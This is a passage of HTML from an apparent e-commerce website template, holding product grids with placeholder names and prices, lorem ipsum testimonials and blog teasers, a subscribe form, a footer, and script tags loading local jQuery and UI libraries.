														<a href="index.html#" class="action-btn"><i class="sp-shopping-cart"></i><span>Add to cart</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-compare-alt"></i><span>Compare</span></a>
													</div>
												</div>
												<div class="product-brief">
													<h2><a href="index.html#">Randomised Words</a></h2>
													<div class="product-brief-inner">
														<h3>$500.00</h3>
														<div class="pro-rating">
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-2"></i></a>
														</div>
													</div>
												</div>
											</div>	
											<!-- Single-product end -->
											<!-- Single-product start -->
											<div class="single-product">
												<div class="product-photo">
													<a href="index.html#">
														<img class="primary-photo" src="img/best-sell/6.jpg" alt="" />
														<img class="secondary-photo" src="img/best-sell/2.jpg" alt="" />
													</a>
													<div class="pro-action">
														<a href="index.html#" class="action-btn"><i class="sp-heart"></i><span>Wishlist</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-shopping-cart"></i><span>Add to cart</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-compare-alt"></i><span>Compare</span></a>
													</div>
												</div>
												<div class="product-brief">
													<h2><a href="index.html#">Randomised Words</a></h2>
													<div class="product-brief-inner">
														<h3>$500.00</h3>
														<div class="pro-rating">
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-2"></i></a>
														</div>
													</div>
												</div>
											</div>	
											<!-- Single-product end -->
										</div>
									</div>
								</div>
								<div role="tabpanel" class="tab-pane fade" id="women">
									<div class="row">
										<div class="col-md-4">
											<!-- Single-product start -->
											<div class="single-product">
												<div class="product-photo">
													<a href="index.html#">
														<img class="primary-photo" src="img/best-sell/6.jpg" alt="" />
														<img class="secondary-photo" src="img/best-sell/1.jpg" alt="" />
													</a>
													<div class="pro-action">
														<a href="index.html#" class="action-btn"><i class="sp-heart"></i><span>Wishlist</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-shopping-cart"></i><span>Add to cart</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-compare-alt"></i><span>Compare</span></a>
													</div>
												</div>
												<div class="product-brief">
													<h2><a href="index.html#">Women's Fashion</a></h2>
													<div class="product-brief-inner">
														<h3>$500.00</h3>
														<div class="pro-rating">
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-2"></i></a>
														</div>
													</div>
												</div>
											</div>	
											<!-- Single-product end -->
											<!-- Single-product start -->
											<div class="single-product">
												<div class="product-photo">
													<a href="index.html#">
														<img class="primary-photo" src="img/best-sell/4.jpg" alt="" />
														<img class="secondary-photo" src="img/best-sell/1.jpg" alt="" />
													</a>
													<div class="pro-action">
														<a href="index.html#" class="action-btn"><i class="sp-heart"></i><span>Wishlist</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-shopping-cart"></i><span>Add to cart</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-compare-alt"></i><span>Compare</span></a>
													</div>
												</div>
												<div class="product-brief">
													<h2><a href="index.html#">Women's Fashion</a></h2>
													<div class="product-brief-inner">
														<h3>$450.00</h3>
														<div class="pro-rating">
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-2"></i></a>
														</div>
													</div>
												</div>
											</div>	
											<!-- Single-product end -->
										</div>
										<div class="col-md-4">
											<!-- Single-product start -->
											<div class="single-product">
												<div class="product-photo">
													<a href="index.html#">
														<img class="primary-photo" src="img/best-sell/5.jpg" alt="" />
														<img class="secondary-photo" src="img/best-sell/2.jpg" alt="" />
													</a>
													<div class="pro-action">
														<a href="index.html#" class="action-btn"><i class="sp-heart"></i><span>Wishlist</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-shopping-cart"></i><span>Add to cart</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-compare-alt"></i><span>Compare</span></a>
													</div>
												</div>
												<div class="product-brief">
													<h2><a href="index.html#">Randomised Words</a></h2>
													<div class="product-brief-inner">
														<h3>$500.00</h3>
														<div class="pro-rating">
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-2"></i></a>
														</div>
													</div>
												</div>
											</div>	
											<!-- Single-product end -->
											<!-- Single-product start -->
											<div class="single-product">
												<div class="product-photo">
													<a href="index.html#">
														<img class="primary-photo" src="img/best-sell/5.jpg" alt="" />
														<img class="secondary-photo" src="img/best-sell/1.jpg" alt="" />
													</a>
													<div class="pro-action">
														<a href="index.html#" class="action-btn"><i class="sp-heart"></i><span>Wishlist</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-shopping-cart"></i><span>Add to cart</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-compare-alt"></i><span>Compare</span></a>
													</div>
												</div>
												<div class="product-brief">
													<h2><a href="index.html#">Randomised Words</a></h2>
													<div class="product-brief-inner">
														<h3>$500.00</h3>
														<div class="pro-rating">
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-2"></i></a>
														</div>
													</div>
												</div>
											</div>	
											<!-- Single-product end -->
										</div>
										<div class="col-md-4">
											<!-- Single-product start -->
											<div class="single-product">
												<div class="product-photo">
													<a href="index.html#">
														<img class="primary-photo" src="img/best-sell/4.jpg" alt="" />
														<img class="secondary-photo" src="img/best-sell/1.jpg" alt="" />
													</a>
													<div class="pro-action">
														<a href="index.html#" class="action-btn"><i class="sp-heart"></i><span>Wishlist</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-shopping-cart"></i><span>Add to cart</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-compare-alt"></i><span>Compare</span></a>
													</div>
												</div>
												<div class="product-brief">
													<h2><a href="index.html#">Women's Fashion</a></h2>
													<div class="product-brief-inner">
														<h3>$450.00</h3>
														<div class="pro-rating">
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-2"></i></a>
														</div>
													</div>
												</div>
											</div>	
											<!-- Single-product end -->
											<!-- Single-product start -->
											<div class="single-product">
												<div class="product-photo">
													<a href="index.html#">
														<img class="primary-photo" src="img/best-sell/6.jpg" alt="" />
														<img class="secondary-photo" src="img/best-sell/2.jpg" alt="" />
													</a>
													<div class="pro-action">
														<a href="index.html#" class="action-btn"><i class="sp-heart"></i><span>Wishlist</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-shopping-cart"></i><span>Add to cart</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-compare-alt"></i><span>Compare</span></a>
													</div>
												</div>
												<div class="product-brief">
													<h2><a href="index.html#">Randomised Words</a></h2>
													<div class="product-brief-inner">
														<h3>$500.00</h3>
														<div class="pro-rating">
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-2"></i></a>
														</div>
													</div>
												</div>
											</div>	
											<!-- Single-product end -->
										</div>
									</div>
								</div>
								<div role="tabpanel" class="tab-pane fade" id="accessories">
									<div class="row">
										<div class="col-md-4">
											<!-- Single-product start -->
											<div class="single-product">
												<div class="product-photo">
													<a href="index.html#">
														<img class="primary-photo" src="img/best-sell/1.jpg" alt="" />
														<img class="secondary-photo" src="img/best-sell/6.jpg" alt="" />
													</a>
													<div class="pro-action">
														<a href="index.html#" class="action-btn"><i class="sp-heart"></i><span>Wishlist</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-shopping-cart"></i><span>Add to cart</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-compare-alt"></i><span>Compare</span></a>
													</div>
												</div>
												<div class="product-brief">
													<h2><a href="index.html#">Randomised Words</a></h2>
													<div class="product-brief-inner">
														<h3>$500.00</h3>
														<div class="pro-rating">
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-2"></i></a>
														</div>
													</div>
												</div>
											</div>	
											<!-- Single-product end -->
											<!-- Single-product start -->
											<div class="single-product">
												<div class="product-photo">
													<a href="index.html#">
														<img class="primary-photo" src="img/best-sell/4.jpg" alt="" />
														<img class="secondary-photo" src="img/best-sell/1.jpg" alt="" />
													</a>
													<div class="pro-action">
														<a href="index.html#" class="action-btn"><i class="sp-heart"></i><span>Wishlist</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-shopping-cart"></i><span>Add to cart</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-compare-alt"></i><span>Compare</span></a>
													</div>
												</div>
												<div class="product-brief">
													<h2><a href="index.html#">Women's Fashion</a></h2>
													<div class="product-brief-inner">
														<h3>$450.00</h3>
														<div class="pro-rating">
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-2"></i></a>
														</div>
													</div>
												</div>
											</div>	
											<!-- Single-product end -->
										</div>
										<div class="col-md-4">
											<!-- Single-product start -->
											<div class="single-product">
												<div class="product-photo">
													<a href="index.html#">
														<img class="primary-photo" src="img/best-sell/2.jpg" alt="" />
														<img class="secondary-photo" src="img/best-sell/4.jpg" alt="" />
													</a>
													<div class="pro-action">
														<a href="index.html#" class="action-btn"><i class="sp-heart"></i><span>Wishlist</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-shopping-cart"></i><span>Add to cart</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-compare-alt"></i><span>Compare</span></a>
													</div>
												</div>
												<div class="product-brief">
													<h2><a href="index.html#">Randomised Words</a></h2>
													<div class="product-brief-inner">
														<h3>$500.00</h3>
														<div class="pro-rating">
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-2"></i></a>
														</div>
													</div>
												</div>
											</div>	
											<!-- Single-product end -->
											<!-- Single-product start -->
											<div class="single-product">
												<div class="product-photo">
													<a href="index.html#">
														<img class="primary-photo" src="img/best-sell/5.jpg" alt="" />
														<img class="secondary-photo" src="img/best-sell/1.jpg" alt="" />
													</a>
													<div class="pro-action">
														<a href="index.html#" class="action-btn"><i class="sp-heart"></i><span>Wishlist</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-shopping-cart"></i><span>Add to cart</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-compare-alt"></i><span>Compare</span></a>
													</div>
												</div>
												<div class="product-brief">
													<h2><a href="index.html#">Randomised Words</a></h2>
													<div class="product-brief-inner">
														<h3>$500.00</h3>
														<div class="pro-rating">
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-2"></i></a>
														</div>
													</div>
												</div>
											</div>	
											<!-- Single-product end -->
										</div>
										<div class="col-md-4">
											<!-- Single-product start -->
											<div class="single-product">
												<div class="product-photo">
													<a href="index.html#">
														<img class="primary-photo" src="img/best-sell/3.jpg" alt="" />
														<img class="secondary-photo" src="img/best-sell/5.jpg" alt="" />
													</a>
													<div class="pro-action">
														<a href="index.html#" class="action-btn"><i class="sp-heart"></i><span>Wishlist</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-shopping-cart"></i><span>Add to cart</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-compare-alt"></i><span>Compare</span></a>
													</div>
												</div>
												<div class="product-brief">
													<h2><a href="index.html#">Women's Fashion</a></h2>
													<div class="product-brief-inner">
														<h3>$450.00</h3>
														<div class="pro-rating">
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-2"></i></a>
														</div>
													</div>
												</div>
											</div>	
											<!-- Single-product end -->
											<!-- Single-product start -->
											<div class="single-product">
												<div class="product-photo">
													<a href="index.html#">
														<img class="primary-photo" src="img/best-sell/6.jpg" alt="" />
														<img class="secondary-photo" src="img/best-sell/2.jpg" alt="" />
													</a>
													<div class="pro-action">
														<a href="index.html#" class="action-btn"><i class="sp-heart"></i><span>Wishlist</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-shopping-cart"></i><span>Add to cart</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-compare-alt"></i><span>Compare</span></a>
													</div>
												</div>
												<div class="product-brief">
													<h2><a href="index.html#">Randomised Words</a></h2>
													<div class="product-brief-inner">
														<h3>$500.00</h3>
														<div class="pro-rating">
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-2"></i></a>
														</div>
													</div>
												</div>
											</div>	
											<!-- Single-product end -->
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<!-- BEST-SELL-AREA END -->
			<!-- ALL-PRODUCT-VIEW START -->
			<div class="all-product-view-area margin-bottom-80">
				<div class="container">
					<div class="row">
						<div class="col-lg-12">
							<div class="all-product-view">
								<div class="row">
									<div class="col-lg-7 col-md-8 offset-md-1 offset-lg-2">
										<div class="all-product-brief">
											<h2>to view all products together  !!</h2>
											<p>There are many variations of passages of Lorem Ipsum available, but the majority have suffered alteration in some form. There are many variations of passages of Lorem Ipsum available, but the majority have suffered alteration in some form</p>
										</div>
									</div>
									<div class="col-md-3">
										<div class="all-product-view-link">
											<a href="index.html#" class="shop-now">View All</a>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<!-- ALL-PRODUCT-VIEW END -->
			<!-- FEATURED-AREA START -->
			<div class="featured-area margin-bottom-80">
				<div class="container">
					<div class="row cus-row-1">
						<div class="single-featured single-featured-1 featured-link">
							<a href="index.html#"><img src="img/featured/1.jpg" alt="" /></a>
							<div class="featured-brief">
								<a href="index.html#"><i class="sp-arrow-long-right"></i></a>
							</div>
						</div>
						<div class="single-featured single-featured-2">
							<div class="single-featured-inner featured-link">
								<a href="index.html#"><img src="img/featured/2.jpg" alt="" /></a>
								<div class="featured-brief">
									<a href="index.html#"><i class="sp-arrow-long-right"></i></a>
								</div>
							</div>
							<div class="single-featured-inner featured-link">
								<a href="index.html#"><img src="img/featured/3.jpg" alt="" /></a>
								<div class="featured-brief">
									<a href="index.html#"><i class="sp-arrow-long-right"></i></a>
								</div>
							</div>
						</div>
						<div class="single-featured single-featured-1 featured-link">
							<a href="index.html#"><img src="img/featured/4.jpg" alt="" /></a>
							<div class="featured-brief">
								<a href="index.html#"><i class="sp-arrow-long-right"></i></a>
							</div>
						</div>
					</div>
				</div>
			</div>
			<!-- FEATURED-AREA END -->
			<!-- BRAND-LOGO-AREA START -->
			<div class="brand-logo-area margin-bottom-80">
				<div class="container">
					<div class="row">
						<div class="col-lg-5">
							<div class="brand-brief">
								<h2 class="border-left-right">they are with us</h2>
								<p>It is a long established fact that a reader will be distracted by the readable content of a page when looking at its layout. </p>
							</div>
						</div>
						<div class="col-lg-7">
							<div class="brand-logo fix">
								<div class="single-logo">
									<img src="img/brand/1.png" alt="" />
								</div>
								<div class="single-logo">
									<img src="img/brand/2.png" alt="" />
								</div>
								<div class="single-logo">
									<img src="img/brand/3.png" alt="" />
								</div>
								<div class="single-logo">
									<img src="img/brand/4.png" alt="" />
								</div>
								<div class="single-logo">
									<img src="img/brand/5.png" alt="" />
								</div>
								<div class="single-logo">
									<img src="img/brand/6.png" alt="" />
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<!-- BRAND-LOGO-AREA END -->
			<!-- TESTIMONIAL-AREA START -->
			<div class="testimonial-area margin-bottom-80">
				<div class="testimonial">
					<h2><sup><i class="sp-quote"></i></sup> they love us</h2>
					<div class="testimonial-border">
						<div class="container">
							<div class="row">
								<div class="col-lg-12">
									<div class="active-testimonial">
										<div class="single-testimonial row">
											<div class="col-lg-4">
												<div class="client-photo">
													<img src="img/testimonial/1.png" alt="" />
												</div>
											</div>
											<div class="col-lg-8">
												<div class="client-opinion">
													<h3>jorina doe</h3>
													<p>Contrary to popular belief, Lorem Ipsum is not simply random text. It has rootsContrary to popular belief, Lorem Ipsum is not simply random text. It has roots. Contrary to popular belief, Lorem Ipsum is not simply random text. It has roots Contrary to popular belief, </p>
												</div>
											</div>
										</div>
										<div class="single-testimonial row">
											<div class="col-lg-4">
												<div class="client-photo">
													<img src="img/testimonial/1.png" alt="" />
												</div>
											</div>
											<div class="col-lg-8">
												<div class="client-opinion">
													<h3>jorina doe</h3>
													<p>Contrary to popular belief, Lorem Ipsum is not simply random text. It has rootsContrary to popular belief, Lorem Ipsum is not simply random text. It has roots. Contrary to popular belief, Lorem Ipsum is not simply random text. It has roots Contrary to popular belief, </p>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<!-- TESTIMONIAL-AREA END -->
			<!-- SERVICE-AREA START -->
			<div class="service-area margin-bottom-80">
				<div class="container">
					<div class="row">
						<div class="col-lg-4 col-md-6">
							<div class="single-service">
								<div class="service-icon">
									<i class="sp-transport"></i>
								</div>
								<div class="service-brief">
									<h3>free shipping</h3>
									<p>There are many variations of passages of Lorem Ipsum available, alteration</p>
								</div>
							</div>
						</div>
						<div class="col-lg-4 col-md-6">
							<div class="single-service">
								<div class="service-icon">
									<i class="sp-head-phone"></i>
								</div>
								<div class="service-brief">
									<h3>help line</h3>
									<p>(+112) 1925184203 - call any time for any support Lorem Ipsum available, alteration </p>
								</div>
							</div>
						</div>
						<div class="col-lg-4 col-md-6">
							<div class="single-service">
								<div class="service-icon">
									<i class="sp-business"></i>
								</div>
								<div class="service-brief">
									<h3>money back guarantee</h3>
									<p>There are many variations of passages of Lorem Ipsum available, alteration</p>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<!-- SERVICE-AREA END -->
			<!-- BLOG-AREA START -->
			<div class="blog-area margin-bottom-80">
				<div class="container">
					<div class="row">
						<div class="col-lg-12">
							<div class="section-title text-center">
								<h2>from blog</h2>
							</div>
						</div>
					</div>			
					<div class="row">
						<div class="col-lg-4 col-md-6">
							<div class="single-blog">
								<div class="blog-photo">
									<a href="index.html#"><img src="img/blog/1.jpg" alt="" /></a>
									<div class="blog-post-date">
										<span>15th</span>
										<span>Jan</span>
									</div>
								</div>
								<div class="blog-brief">
									<p>Lorem ipsum dolr sit amet, It is not simply random text. It has roots...</p>
									<div class="like-comment">
										<a href="index.html#"><i class="sp-like"></i>120 like</a>
										<a href="index.html#"><i class="sp-comment"></i>60 comment</a>
									</div>
									<a class="shop-now" href="index.html#">Read more</a>
								</div>
							</div>
						</div>
						<div class="col-lg-4 col-md-6">
							<div class="single-blog">
								<div class="blog-photo">
									<a href="index.html#"><img src="img/blog/2.jpg" alt="" /></a>
									<div class="blog-post-date">
										<span>13th</span>
										<span>Feb</span>
									</div>
								</div>
								<div class="blog-brief">
									<p>Lorem ipsum dolr sit amet, It is not simply random text. It has roots...</p>
									<div class="like-comment">
										<a href="index.html#"><i class="sp-like"></i>120 like</a>
										<a href="index.html#"><i class="sp-comment"></i>60 comment</a>
									</div>
									<a class="shop-now" href="index.html#">Read more</a>
								</div>
							</div>
						</div>
						<div class="col-lg-4 col-md-6">
							<div class="single-blog">
								<div class="blog-photo">
									<a href="index.html#"><img src="img/blog/3.jpg" alt="" /></a>
									<div class="blog-post-date">
										<span>25th</span>
										<span>Feb</span>
									</div>
								</div>
								<div class="blog-brief">
									<p>Lorem ipsum dolr sit amet, It is not simply random text. It has roots...</p>
									<div class="like-comment">
										<a href="index.html#"><i class="sp-like"></i>120 like</a>
										<a href="index.html#"><i class="sp-comment"></i>60 comment</a>
									</div>
									<a class="shop-now" href="index.html#">Read more</a>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<!-- BLOG-AREA END -->
			<!-- SUBSCRIBE-AREA START -->
			<div class="suscribe-area margin-bottom-80">
				<div class="container">
					<div class="row">
						<div class="col-lg-12">
							<div class="subscribe">
								<div class="subscribe-brief">
									<h3>enter your email address</h3>
									<p>There are many variations of passages of Lorem Ipsum available, but the majority have suffered alteration in some form.</p>
								</div>
								<div class="subscribe-form">
									<form action="index.html#">
										<input type="text" placeholder="Enter email to subscribe" />
										<button type="submit">Submit</button>
									</form>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<!-- SUBSCRIBE-AREA START END -->
		</section>
		<!-- PAGE-CONTENT END -->
				
		<!-- FOOTER-AREA START -->
		<footer class="footer-area">
			<div class="footer-top">
				<div class="footer">
					<div class="container">
						<div class="row">
							<div class="col-lg-4">
								<div class="single-footer footer-logo">
									<img src="img/logo.png" alt="" />
									<p>Contrary to popular belief, Lorem Ipsum is not simply random text. It has roots in a piece of classical Latin literature from 45 BC, making it over 2000 years old.</p>
								</div>
							</div>
							<div class="col-lg-3 col-md-4">
								<div class="single-footer footer-contact">
									<h2>contact us</h2>
									<ul>
										<li>
											<i class="sp-phone"></i> 
											<span>+019 (111) 25184203</span>
										</li>
										<li>
											<i class="sp-email"></i>
											<span>company@domain.com</span>
											<span>company@email.info</span>
										</li>
										<li>
											<i class="sp-map-marker"></i> 
											<span>777/ab Rampura Bonosri</span>
											<span>North DC-3050 USA.</span>
										</li>
									</ul>
								</div>
							</div>
							<div class="col-md-2">
								<div class="single-footer footer-menu">
									<h2>company</h2>
									<ul>
										<li><a href="index.html#">Account</a></li>
										<li><a href="index.html#">Log in</a></li>
										<li><a href="index.html#">Regester</a></li>
										<li><a href="index.html#">Shop</a></li>
										<li><a href="index.html#">Chakeout</a></li>
									</ul>
								</div>
							</div>
							<div class="col-lg-3 col-md-4">
								<div class="single-footer footer-message">
									<form action="index.html#">
										<h2>Quick contact</h2>
										<div class="footer-message-box">
											<input type="text" placeholder="your email address" />
											<textarea placeholder="your messege" ></textarea>
											<input type="submit" value="submit"/>
										</div>
									</form>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<div class="copyright">
				<div class="container">
					<div class="row">
						<div class="col-md-6">
							<div class="copyright-brief">
								<p>Copyright &copy; <a href="https://themeforest.net/user/codecarnival/portfolio">Codecarnival</a> All right reserved</p>
							</div>
						</div>
						<div class="col-md-6">
							<div class="footer-social text-center text-md-end">
								<a href="index.html#"><i class="sp-facebook"></i></a>
								<a href="index.html#"><i class="sp-twitter"></i></a>
								<a href="index.html#"><i class="sp-linkedin"></i></a>
								<a href="index.html#"><i class="sp-google"></i></a>
							</div>
						</div>
					</div>
				</div>
			</div>
		</footer>
		<!-- FOOTER-AREA END -->

		
		<!-- all js here -->
		<!-- jquery latest version -->
        <script src="js/vendor/jquery-3.6.0.min.js"></script>
        <script src="js/vendor/jquery-migrate-3.3.2.min.js"></script>
		<!-- bootstrap js -->
        <script src="js/bootstrap.bundle.min.js"></script>
		<!-- jquery.nivo.slider js -->
        <script src="lib/js/jquery.nivo.slider.js"></script>
        <script src="lib/home.js"></script>
		<!-- owl.carousel js -->
        <script src="js/owl.carousel.min.js"></script>
		<!-- meanmenu js -->
        <script src="js/jquery.meanmenu.js"></script>
		<!-- jquery-ui js -->
        <script src="js/jquery-ui.min.js"></script>
		<!-- lightbox.min js -->
        <script src="js/lightbox.min.js"></script>
		<!-- countdon.min js -->
        <script src="js/countdon.min.js"></script>
		<!-- wow js -->
        <script src="js/wow.min.js"></script>
		<script type="text/javascript">
			new WOW().init();
		</script>
		<!-- plugins js -->
        <script src="js/plugins.js"></script>
		<!-- main js -->
        <script src="js/main.js"></script>
    </body>
</html>
